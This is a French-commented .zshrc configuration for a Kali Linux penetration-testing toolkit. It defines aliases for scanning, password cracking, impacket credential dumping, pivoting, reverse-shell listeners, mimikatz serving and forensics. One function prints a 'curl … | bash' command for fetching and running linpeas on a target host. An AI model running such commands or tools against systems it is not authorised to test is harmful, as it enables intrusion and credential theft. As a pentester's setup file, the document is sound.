# ============================================================
#   .zshrc — Cybersecurity Toolkit
#   Kali Linux / Parrot OS
# ============================================================

# ── PATHS ────────────────────────────────────────────────────
export PATH="$HOME/.local/bin:$HOME/tools:$PATH"
export WORDLISTS="$HOME/wordlists"
export TOOLS="$HOME/tools"

# ── PROMPT (différent selon root ou user normal) ──────────────
if [ "$EUID" -eq 0 ]; then
  PROMPT="%F{red}[ROOT@%m]%f %F{yellow}%~%f # "
else
  PROMPT="%F{red}[%f%F{yellow}%n%f%F{red}@%f%F{cyan}%m%f%F{red}]%f %F{green}%~%f %% "
fi

# ── ALIASES GÉNÉRAUX ─────────────────────────────────────────
alias ll='ls -lah --color=auto'
alias cls='clear'
alias myip='curl -s ifconfig.me && echo'
alias localip="ip -br a | grep UP | awk '{print \$3}'"

# ── ALIASES RECON (apt) ───────────────────────────────────────
alias nmap-quick='nmap -sV -sC -T4'
alias nmap-full='nmap -sV -sC -p- -T4'
alias nmap-udp='nmap -sU -T4'
alias nmap-vuln='nmap --script vuln'

# ── ALIASES WEB (apt) ─────────────────────────────────────────
alias ffuf-dir='ffuf -u TARGET/FUZZ -w $WORDLISTS/directories/medium.txt -fc 404'
alias ffuf-sub='ffuf -u http://TARGET -H "Host: FUZZ.TARGET" -w $WORDLISTS/subdomains/top5000.txt -ac'
alias gobuster-dir='gobuster dir -w $WORDLISTS/directories/medium.txt'

# ── ALIASES PASSWORDS (apt) ───────────────────────────────────
alias john-rock='john --wordlist=$WORDLISTS/passwords/rockyou.txt'
alias hashcat-rock='hashcat -a 0 -w 3'

# ── ALIASES UTILS ─────────────────────────────────────────────
alias serve='python3 -m http.server 8080'
alias listen='nc -lvnp'

# ============================================================
#   ALIASES OUTILS GITHUB → ~/tools/
#   ⚠️  Certains outils nécessitent une étape post-clone
#      avant de fonctionner (pip install, go build...)
#      Voir commentaires de chaque section.
# ============================================================

# ── RECON & OSINT ────────────────────────────────────────────

# spiderfoot → interface web sur http://127.0.0.1:5001
alias spiderfoot='python3 $TOOLS/spiderfoot/sf.py -l 127.0.0.1:5001'

# photon → crawleur OSINT
alias photon='python3 $TOOLS/photon/photon.py'

# datasploit → ⚠️ pip install -r requirements.txt avant
alias datasploit='python3 $TOOLS/datasploit/datasploit.py'

# social-analyzer → ⚠️ pip install -r requirements.txt avant
alias social-analyzer='python3 $TOOLS/social-analyzer/app.py --cli'

# ── WEB SECURITY ─────────────────────────────────────────────

# xsstrike → scanner XSS
alias xsstrike='python3 $TOOLS/xsstrike/xsstrike.py'

# brutexss → brute-force XSS
alias brutexss='python3 $TOOLS/brutexss/brutexss.py'

# gopherus → payloads SSRF
alias gopherus='python3 $TOOLS/gopherus/gopherus.py'

# drupwn → ⚠️ pip install -r requirements.txt avant
alias drupwn='python3 $TOOLS/drupwn/drupwn.py'

# droopescan → scanner CMS
alias droopescan='python3 $TOOLS/droopescan/droopescan'

# ── NETWORK ──────────────────────────────────────────────────

# impacket → ⚠️ pip install . dans ~/tools/impacket/ avant
alias secretsdump='python3 $TOOLS/impacket/examples/secretsdump.py'
alias psexec='python3 $TOOLS/impacket/examples/psexec.py'
alias smbclient-imp='python3 $TOOLS/impacket/examples/smbclient.py'
alias wmiexec='python3 $TOOLS/impacket/examples/wmiexec.py'
alias atexec='python3 $TOOLS/impacket/examples/atexec.py'
alias GetNPUsers='python3 $TOOLS/impacket/examples/GetNPUsers.py'
alias GetUserSPNs='python3 $TOOLS/impacket/examples/GetUserSPNs.py'
alias mssqlclient='python3 $TOOLS/impacket/examples/mssqlclient.py'
alias lookupsid='python3 $TOOLS/impacket/examples/lookupsid.py'

# smtp-user-enum → ⚠️ pip install -r requirements.txt avant
alias smtp-user-enum='python3 $TOOLS/smtp-user-enum/smtp-user-enum.py'

# sipvicious → ✅ scripts à la racine du repo cloné
alias svmap='python3 $TOOLS/svmap/svmap.py'
alias svwar='python3 $TOOLS/svmap/svwar.py'
alias svcrack='python3 $TOOLS/svmap/svcrack.py'

# ── POST-EXPLOITATION ────────────────────────────────────────

# linpeas → à servir ou lancer localement
alias linpeas='bash $TOOLS/PEASS-ng/linPEAS/linpeas.sh'

# winpeas → binaire Windows, à transférer sur la cible
# Chemin : $TOOLS/PEASS-ng/winPEAS/winPEASx64.exe

# bashfuscator → ⚠️ pip install . dans le dossier avant
alias bashfuscator='python3 $TOOLS/bashfuscator/bashfuscator/bashfuscator.py'

# pwncat → ⚠️ pip install pwncat-cs (s'installe globalement)
alias pwncat='pwncat-cs'

# evil-winrm → ⚠️ gem install evil-winrm avant
alias evil-winrm='ruby $TOOLS/evil-winrm/evil-winrm.rb'

# crackmapexec → ⚠️ pip install crackmapexec (s'installe globalement)
alias cme='crackmapexec'

# mimikatz → ⚠️ Binaire Windows uniquement — à transférer sur la cible
# Chemin : $TOOLS/mimikatz/x64/mimikatz.exe
alias serve-mimikatz='cd $TOOLS/mimikatz/x64 && python3 -m http.server 8080'

# ── PIVOTING & TUNNELING ──────────────────────────────────────

# chisel → ⚠️ go build . dans le dossier (ou télécharger le binaire release)
alias chisel='$TOOLS/chisel/chisel'
alias chisel-server='$TOOLS/chisel/chisel server -p 8080 --reverse'
alias chisel-client='$TOOLS/chisel/chisel client'

# ligolo-ng → ⚠️ go build dans cmd/proxy et cmd/agent (ou télécharger release)
alias ligolo-proxy='$TOOLS/ligolo-ng/proxy -selfcert'
alias ligolo-agent='$TOOLS/ligolo-ng/agent'

# proxychains-ng → ⚠️ ./configure && make && make install dans le dossier
alias proxychains='proxychains4'

# sshuttle → ⚠️ pip install sshuttle (s'installe globalement, pas besoin d'alias)

# ── REVERSE SHELLS ────────────────────────────────────────────

# revshells → interface web offline (ouvrir dans le navigateur)
alias revshells='xdg-open $TOOLS/revshells/index.html 2>/dev/null || echo "Ouvre manuellement : $TOOLS/revshells/index.html"'

# revshell → notre script CLI maison
alias revshell='bash $HOME/toolkit/scripts/revshell.sh'

# ── FORENSICS ────────────────────────────────────────────────

# volatility3 → analyse mémoire
# Exemples : vol -f memory.dmp windows.pslist
#            vol -f memory.dmp windows.hashdump
alias vol='python3 $TOOLS/volatility3/vol.py'

# autopsy → ⚠️ Interface graphique Java
alias autopsy='cd $TOOLS/autopsy && ./bin/autopsy'

# plaso → ⚠️ pip install plaso avant
alias log2timeline='python3 $TOOLS/plaso/tools/log2timeline.py'
alias psort='python3 $TOOLS/plaso/tools/psort.py'
alias pinfo='python3 $TOOLS/plaso/tools/pinfo.py'

# ── FONCTIONS UTILES ──────────────────────────────────────────

# Créer le dossier de travail pour une cible
target() {
  local name="${1:-target}"
  mkdir -p "$name"/{recon,web,exploit,loot,notes}
  echo "[*] Workspace créé : $name/"
  cd "$name"
}

# Scan nmap rapide + sauvegarde automatique
quickscan() {
  local ip="$1"
  local out="${2:-scan}"
  echo "[*] Scan de $ip..."
  nmap -sV -sC -T4 "$ip" -oA "$out"
  echo "[✓] Résultats dans $out.*"
}

# Listener netcat
nc-listen() {
  local port="${1:-4444}"
  echo "[*] En écoute sur le port $port..."
  nc -lvnp "$port"
}

# Servir linpeas via HTTP + affiche la commande à taper sur la cible
serve-linpeas() {
  local ip
  ip=$(ip -br a | grep UP | awk '{print $3}' | head -1 | cut -d'/' -f1)
  echo "[*] Serving linpeas depuis $TOOLS/PEASS-ng/linPEAS/"
  echo "[*] Sur la cible : curl http://$ip:8080/linpeas.sh | bash"
  cd "$TOOLS/PEASS-ng/linPEAS" && python3 -m http.server 8080
}

# Servir n'importe quel fichier depuis ~/tools/ via HTTP
serve-tool() {
  local tool_path="$1"
  local ip
  ip=$(ip -br a | grep UP | awk '{print $3}' | head -1 | cut -d'/' -f1)
  echo "[*] Serving $(basename $tool_path)..."
  echo "[*] Sur la cible : curl http://$ip:8080/$(basename $tool_path) -o $(basename $tool_path)"
  cd "$(dirname $tool_path)" && python3 -m http.server 8080
}

# Encoder / décoder base64
b64e() { echo -n "$1" | base64; }
b64d() { echo -n "$1" | base64 -d; }

# URL encode
urlencode() { python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"; }


